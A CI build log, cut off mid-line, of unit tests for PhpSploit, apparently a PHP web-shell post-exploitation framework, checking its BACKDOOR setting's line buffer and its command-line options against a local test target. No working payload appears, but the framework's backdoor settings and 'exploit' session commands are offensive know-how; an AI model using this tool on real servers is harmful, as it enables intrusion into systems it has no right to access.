Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# BACKDOOR repr should simply show the value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE 'SingleValue%%PASSKEY%%'\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mRandLine\u001b[m\n[Unit Tests/build]   | \u001b[33;2m1 choice\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# set BACKDOOR to EMPTY BUFFER. should FAIL with:\u001b[m\n[Unit Tests/build]   | \u001b[33;2m#   'couldn't find an *usable-choice from buffer lines'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m> $IN\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"couldn't find an \\*usable-choice from buffer lines\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### test 'set <SETTING> + <VALUE>' syntax\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# bind to FILE_5LINES, check buffer is updated\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + file://$FILE_5LINES > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<RandLine@$FILE_5LINES (3 choices)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# add an INVALID choice, unbinding the buffer from file:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + invalidLine > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check it's still 3 choices, as our line is not an *usable-choice\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<RandLine@[a-f0-9]\\{32\\} (3 choices)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# but check buffer actually has the last line\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > /dev/null\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtail -n1 $OUT | grep -q '^invalidLine$' || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# add an VALID choice:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + validLine%%PASSKEY%% > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check it's now 4 choices, because the added choice is an *usable-value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<RandLine@[a-f0-9]\\{32\\} (4 choices)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# but check buffer actually has the last line\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > /dev/null\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtail -n1 $OUT | grep -q '^validLine' || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# bind to FILE_INVALID, check buffer is kept\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + file://$FILE_INVALID > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<RandLine@$FILE_INVALID (4 choices)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# re-bind to FILE_5LINES, check buffer is updated\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + file://$FILE_5LINES > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<RandLine@$FILE_5LINES (3 choices)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# re-bind to FILE_EMPTY, check buffer is kept\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + file://$FILE_EMPTY > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<RandLine@$FILE_EMPTY (3 choices)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# reset to default value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR %%DEFAULT%% > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"HTTP_%%PASSKEY%%\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# FAIL to reset to FILE_EMPTY or FILE_INVALID\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR file://FILE_EMPTY > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR file://FILE_INVALID > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check buffer still the same as before (%%DEFAULT%%)\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"HTTP_%%PASSKEY%%\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core/linebuf.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=18s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/command-line-options.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/command-line-options.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.IucUICfeId\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ARGV1: long cli option name (e.g: --eval)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ARGV2: optional value for argument\u001b[m\n[Unit Tests/build]   | \u001b[33;2m#\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# FAIL if $retval or STDOUT differ when using argument's different forms.\u001b[m\n[Unit Tests/build]   | \u001b[33;2m#   short:   '-e $value'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m#   long:    '--eval $value'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m#   long_eq: '--eval=$value'\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfunction test_opt () {\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    local short_opt=\"-${1:2:1}\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    local long_opt=\"$1\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    local value=\"$2\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    if [ -z \"$value\" ]; then\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        echo exit | $PHPSPLOIT $short_opt > $TMPFILE-test_opt-short\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        local ret1=$?\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        echo exit | $PHPSPLOIT $long_opt > $TMPFILE-test_opt-long\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        local ret2=$?\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        [ \"$ret1\" == \"$ret2\" ] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        diff $TMPFILE-test_opt-short $TMPFILE-test_opt-long || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    else\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        echo exit | $PHPSPLOIT $short_opt \"$value\" > $TMPFILE-test_opt-short\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        local ret1=$?\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        echo exit | $PHPSPLOIT $long_opt \"$value\" > $TMPFILE-test_opt-long\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        local ret2=$?\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        echo exit | $PHPSPLOIT \"$long_opt=$value\" > $TMPFILE-test_opt-long_eq\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        local ret3=$?\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        [ \"$ret1\" == \"$ret2\" ] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        diff $TMPFILE-test_opt-short $TMPFILE-test_opt-long || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        [ \"$ret2\" == \"$ret3\" ] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        diff $TMPFILE-test_opt-long $TMPFILE-test_opt-long_eq || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    fi\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # output result\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    cat $TMPFILE-test_opt-short\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # store return value into $retval\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    retval=\"$ret1\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # remove files used by function\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    rm -f $TMPFILE-test_opt-*\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    return \"$retval\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m}\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# make sure ARGV1 file outputs standard argparse cli error\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfunction assert_cli_error () {\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $1 << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^usage: phpsploit \u001b[m\n[Unit Tests/build]   | \u001b[33;2m^phpsploit: error: \u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m}\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# return 0 if command timed-out (aka: is interactive)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfunction is_interactive () {\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    local script=$TMPFILE-is_interactive.sh\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    echo -e \"#!/bin/bash\\n$@\" > $script\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    chmod +x $script\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    script -qefc \"timeout 6 $script\" /dev/null > $TMPFILE-is_interactive 2>&1\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    local ret=\"$?\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    #rm $script\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    [ \"$ret\" -eq 124 ] && return 0 || return 1\u001b[m\n[Unit Tests/build]   | \u001b[33;2m}\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### --help\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --help && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT --help=INVALID 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2musage: .*phpsploit\u001b[m\n[Unit Tests/build]   | \u001b[33;2m--help: ignored explicit argument 'INVALID'\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --help > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  -h, --help\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  -v, --version\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  -c <FILE>, --config <FILE>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  -l <SESSION>, --load <SESSION>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  -t <URL>, --target <URL>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  -s <FILE>, --source <FILE>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  -e <CMD>, --eval <CMD>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  -i, --interactive\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### ensure all options are being tested in current test file\u001b[m\n[Unit Tests/build]   | \u001b[33;2moptions=\"$(grep -- -- $TMPFILE | perl -pe 's|(^.*--(.*?) .*$)|\\2|')\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfor opt in $options; do\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    assert_contains $SCRIPTFILE \"^test_opt --$opt \"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    assert_contains $SCRIPTFILE \"^is_interactive \\$PHPSPLOIT --$opt \"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdone\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### --version\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --version && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --version > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^PhpSploit Framework, version \u001b[m\n[Unit Tests/build]   | \u001b[33;2m^License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^This is free software; you are free to change and redistribute it.\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^There is NO WARRANTY, to the extent permitted by law.\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# FAIL if option has argument\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --version INVALID 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### --config\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### succeed with VALID conf file\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $TMPFILE-conf << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  # valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2malias test_alias 'lrun true' # valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset EDITOR test_set\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --config $TMPFILE-conf || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check existence of newly created alias\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --config $TMPFILE-conf > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -c $TMPFILE-conf -e 'alias' > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m test_alias .* lrun true$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check that original $PHPSPLOIT_CONFIG_DIR is NOT loaded\u001b[m\n[Unit Tests/build]   | \u001b[33;2mnum_aliases=$(sed -e '1,/---/d' -e '/^$/,$d' $TMPFILE | wc -l)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[ \"$num_aliases\" == 1 ] || FAIL # only declared `test_alias` should exist\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check existence of newly created setting\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -c $TMPFILE-conf -e 'set' > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m EDITOR .* test_set$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### FAIL with INVALID conf file\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $TMPFILE-conf << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  # valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2malias test_alias 'lrun true' # valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2msession load / # THIS COMMAND SHOULD FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset EDITOR test_set\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --config $TMPFILE-conf > /dev/null 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE-conf\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### FAIL if called without value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --config 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### --load\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### succeed with VALID session file\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e \"exploit; env TEST_ENV FOOBAR; session save $TMPFILE-sess\" > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mSession saved into '$TMPFILE-sess'\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --load $TMPFILE-sess || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# test option\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --load $TMPFILE-sess > /dev/null || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check session is loaded\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -l $TMPFILE-sess -e \"session\" > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mConfiguration Settings\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEnvironment Variables\u001b[m\n[Unit Tests/build]   | \u001b[33;2mTEST_ENV .* FOOBAR$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# compare --load option with 'session load' command\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e \"session load $TMPFILE-sess; session\" > $TMPFILE-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE $TMPFILE-2 || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### FAIL with INVALID session file\u001b[m\n[Unit Tests/build]   | \u001b[33;2mecho \"INVALID SESSION FILE CONTENT\" > $TMPFILE-sess || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# test option\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --load $TMPFILE-sess > /dev/null 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE-sess $TMPFILE-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### FAIL if called without value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --load 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### --target\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --target localhost || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### succeed with VALID target\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# test option\u001b[m\n[Unit Tests/build]   | \u001b[33;2mTARGET=\"10.0.156.11:8080\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --target $TARGET > /dev/null || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check target is set\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -t $TARGET -e \"set\" > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m TARGET .* http://$TARGET/$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### FAIL if called with INVALID target\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --target / > /dev/null 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### FAIL if called without argument\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --target > /dev/null 2> 